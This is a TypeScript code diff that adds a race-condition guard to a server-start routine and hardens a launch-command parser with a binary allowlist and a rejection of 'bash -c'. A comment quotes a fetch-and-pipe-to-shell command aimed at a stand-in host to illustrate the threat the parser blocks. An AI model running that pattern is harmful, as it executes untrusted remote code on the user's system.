@@ -80,6 +80,11 @@ export class HindsightManager {
    *  so the very first recall doesn't fire a wasted 800ms probe before boot-time start()
    *  has had a chance to spawn. See isAvailable(). */
   private hasAttemptedStart = false;
+  /** Synchronous re-entry guard — true while a start() call is in flight (before any
+   *  await). Closed in finally. Prevents two concurrent start() calls from each passing
+   *  the serverProcess check (serverProcess isn't assigned until spawnServer returns,
+   *  which is after the first await). See start(). */
+  private pendingStart = false;
   /** When the last healthCheck saw 401/403 — used to surface "Cloud key rejected" vs
    *  "server not yet ready". Cleared on a successful response. Cached longer than
    *  AVAILABILITY_TTL_MS (see AUTH_FAILURE_TTL_MS). */
@@ -495,17 +500,15 @@ export class HindsightManager {
     try {
       this.hasAttemptedStart = true;
       // IDEMPOTENT RE-ENTRY GUARD — start() is called from BOTH boot (main.ts:996) AND
-      // on every debounced setHindsightConfig IPC (every field edit). If we already own
-      // a spawn (serverProcess set), no-op the entire body. Otherwise:
-      //   (a) a user who edits a field after the server is healthy would re-enter the
-      //       `if (healthy)` branch below, clobber `isAppManaged = false`, and orphan
-      //       the spawned tree on quit;
-      //   (b) a fast user editing during the boot-time grace window could fire two
-      //       concurrent spawnServer() calls, both binding port 8888 → one fails →
-      //       false 'spawn-failed' banner even though the server IS running.
-      // Both regressions were latent for the whole Hindsight lifetime and only surfaced
-      // now because the round-3 debounced auto-save made them trivially reachable.
-      if (this.serverProcess) return;
+      // on every debounced setHindsightConfig IPC (every field edit). We use a SYNCHRONOUS
+      // pendingStart flag (set before any await) so two start() calls landing within the
+      // same microtask — before serverProcess is assigned inside spawnServer() — still
+      // bail out cleanly. The serverProcess check alone is racy: between start()'s
+      // `await healthCheck()` yielding and spawnServer() returning, a second start()
+      // would see serverProcess===null and proceed to a second spawnServer() → two
+      // children both binding port 8888. The pendingStart boolean closes that window.
+      if (this.serverProcess || this.pendingStart) return;
+      this.pendingStart = true;
       const cfg = this.getHindsightConfig();
       if (!cfg) return;                 // no baseUrl → feature off, stay Noop
       // SELF-HEALING AUTO-FLIP — `hindsightMemory` is default-OFF in the flag registry
@@ -586,6 +589,12 @@ export class HindsightManager {
       this.pollUntilReady();
     } catch (e: any) {
       console.warn('[HindsightManager] start skipped (non-fatal):', e?.message);
+    } finally {
+      // Always release the pendingStart guard, regardless of which branch (auto-flip
+      // rejection, cfg-null, memoryFlagOn, no-cmd, healthy, spawned, throw) we exit
+      // through. Without this the guard would never release on early-returns and
+      // every subsequent start() would silently no-op.
+      this.pendingStart = false;
     }
   }
 
@@ -755,7 +764,21 @@ export class HindsightManager {
     }
     if (inQuote) return null;          // unterminated quote → malformed
     if (sawToken) argv.push(cur);
-    return argv.length ? argv : null;
+    if (!argv.length) return null;
+    // CRITICAL — `bash -c "curl evil | sh"` parses cleanly above (all metacharacters
+    // are inside quotes) but `bash -c` is itself a shell-execution vector. The parser's
+    // metachar scan can't catch it because the shell interprets `-c` as a flag, not a
+    // character. Allowlist argv[0] to a known-safe set: the bundled bash launcher,
+    // node/python for hypothetical custom launchers. ANY other binary → reject. The
+    // bundled auto-spawn path uses `bash <abs path>/hindsight-start.sh` which passes.
+    const SAFE_BINARIES = new Set(['bash', 'sh', 'node', 'python', 'python3']);
+    const base = (argv[0].split(/[\\/]/).pop() || '').toLowerCase();
+    if (!SAFE_BINARIES.has(base)) return null;
+    // Also reject `bash -c <command>` and `bash -lc <command>` explicitly — even
+    // though bash itself is allowlisted, `-c`/`-lc` allow arbitrary command execution
+    // and defeat the argv scan. Reject any argv[1] starting with `-c` or `-l`.
+    if (argv[1] && (argv[1] === '-c' || argv[1] === '-lc' || argv[1].startsWith('-c') || argv[1].startsWith('-lc'))) return null;
+    return argv;
   }
 
   private spawnServer(command: string): void {
